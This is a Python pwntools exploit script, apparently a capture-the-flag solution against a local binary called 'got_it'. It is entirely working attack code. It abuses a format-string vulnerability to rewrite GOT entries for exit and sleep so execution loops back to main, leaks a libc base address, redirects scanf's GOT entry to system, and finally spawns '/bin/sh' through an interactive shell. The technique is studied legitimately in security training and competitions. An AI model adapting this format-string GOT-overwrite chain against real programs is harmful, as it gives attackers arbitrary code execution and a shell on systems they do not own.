from pwn import *

e = ELF("./got_it")

libc = ELF("./libc.so.6")

p = process("./got_it")


#context.log_level="debug"
gdb.attach(p, """break * main+176
c""")

main = e.sym["main"]	# 0x4012f9

print("main", hex(main))
print("exit", hex(e.got["exit"]))

ret = 0x40101a
print("ret gadget", hex(ret))

signal = 0x403f90
sleep = 0x403fc8

print("sleep", hex(sleep))


p.recvuntil("out!")

# our inputs starts at offset 18

exploit = "%18$hn"
exploit += "%21$hn"
exploit += "%{}p%19$hn".format(0x40)
exploit += "%22$hn"
exploit += "%{}p%23$hn".format(0x101a-0x40)
exploit += "%{}p%20$hn".format(0x12f9-0x101a)

exploit += "|%31$p|"

exploit = exploit.ljust(80)

exploit += p64(e.got["exit"]+4)
exploit += p64(e.got["exit"]+2)
exploit += p64(e.got["exit"])

exploit += p64(sleep+4)
exploit += p64(sleep+2)
exploit += p64(sleep)

exploit += "AAAA"

p.sendline(exploit)

p.recvuntil("|")

dat = p.recv()

dat = dat.split("|")

libc.address = int(dat[0][2:], 16) - 0x3f3660

print("libc address", hex(libc.address))

p.sendline()
p.sendline()


og = libc.sym["system"]
print("calling", hex(og))


h = hex(og)[2:]

high = int(h[:-8], 16)
mid = int(h[-8:-4], 16)
low = int(h[-4:], 16)

print("high", hex(high))
print("mid", hex(mid))
print("low", hex(low))

order = sorted([[low, e.got["__isoc99_scanf"], "low"], [mid, e.got["__isoc99_scanf"]+2, "mid"], [high, e.got["__isoc99_scanf"]+4, "high"]], key = lambda x: x[0])

print([[hex(a[0]), hex(a[1]), a[2]] for a in order])

exploit = ""

exploit += "%{}p%18$hn%{}p%19$hn%{}p%20$hn".format(order[0][0], order[1][0]-order[0][0], order[2][0]-order[1][0])


exploit = exploit.ljust(80)


exploit += p64(order[0][1])
exploit += p64(order[1][1])
exploit += p64(order[2][1])



p.sendline(exploit)

p.sendline()
p.sendline()


p.sendline("/bin/sh")

p.interactive()
